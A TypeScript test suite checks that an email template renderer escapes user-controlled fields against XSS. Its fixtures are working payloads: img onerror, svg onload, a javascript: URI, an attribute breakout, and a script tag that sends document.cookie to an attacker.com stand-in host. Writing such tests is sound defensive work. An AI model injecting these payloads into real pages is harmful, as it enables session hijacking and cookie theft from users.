import { strict as assert } from 'assert';
import { escapeHtml, renderEmailHtml } from '../src/core/emailService';

async function runTests() {
  console.log('=== Ballast Security S5: Email Template XSS Prevention Test Suite ===\n');

  // Test 1: escapeHtml unit tests
  console.log('[Test 1] Testing escapeHtml unit sanitization...');
  assert.equal(escapeHtml('<script>alert("xss")</script>'), '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
  assert.equal(escapeHtml("Tom & Jerry's 'Special'"), 'Tom &amp; Jerry&#039;s &#039;Special&#039;');
  assert.equal(escapeHtml(null), '');
  assert.equal(escapeHtml(undefined), '');
  console.log('  Passed: All HTML special characters safely escaped.');

  // Test 2: renderEmailHtml with malicious injection payload in title and question
  console.log('\n[Test 2] Testing renderEmailHtml with embedded XSS and script tags...');
  const maliciousParams = {
    type: 'brief_published' as const,
    title: '<img src=x onerror=alert(1)> "Executive" Brief & Overview',
    question: 'How do we handle <script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>?',
    summaryOrError: '<a href="javascript:alert(1)">Click here for error details</a>',
    claimCount: 4,
    viewUrl: 'http://localhost:3000/app?briefId="><script>alert(document.domain)</script>',
  };

  const html = renderEmailHtml(maliciousParams);

  // Assertions: unescaped dangerous payloads must NOT be present in output HTML
  assert.ok(!html.includes('<img src=x onerror=alert(1)>'), 'Unescaped img onerror tag must not appear in HTML');
  assert.ok(!html.includes('<script>'), 'Unescaped <script> tag must not appear in HTML');
  assert.ok(!html.includes('javascript:alert(1)'), 'Unescaped javascript: URI tag must not appear in HTML');

  // Assertions: escaped versions must be present
  assert.ok(html.includes('&lt;img src=x onerror=alert(1)&gt;'), 'Escaped img tag must appear in HTML');
  assert.ok(html.includes('&lt;script&gt;'), 'Escaped script tag must appear in HTML');
  assert.ok(html.includes('&amp; Overview'), 'Escaped ampersand must appear in HTML');
  assert.ok(html.includes('&quot;Executive&quot;'), 'Escaped quotes must appear in HTML');

  console.log('  Passed: All user-controlled fields escaped, neutralizing XSS vectors.');

  // Test 3: Failed brief HTML escaping
  console.log('\n[Test 3] Testing renderEmailHtml for failed brief...');
  const failedHtml = renderEmailHtml({
    type: 'brief_failed',
    title: 'Failure <script>alert(1)</script>',
    question: 'Question & details',
    summaryOrError: 'Fatal Error: <svg onload=alert(1)> occurred during execution',
    viewUrl: 'http://localhost:3000/app',
  });

  assert.ok(!failedHtml.includes('<svg onload=alert(1)>'), 'Unescaped SVG payload must not appear');
  assert.ok(failedHtml.includes('&lt;svg onload=alert(1)&gt;'), 'Escaped SVG payload must appear');
  console.log('  Passed: Error summary fields safely escaped.');

  console.log('\n[PASS] All Security S5 email template XSS prevention tests passed successfully!\n');
}

runTests().catch((err) => {
  console.error('[FAIL] Test error:', err);
  process.exit(1);
});
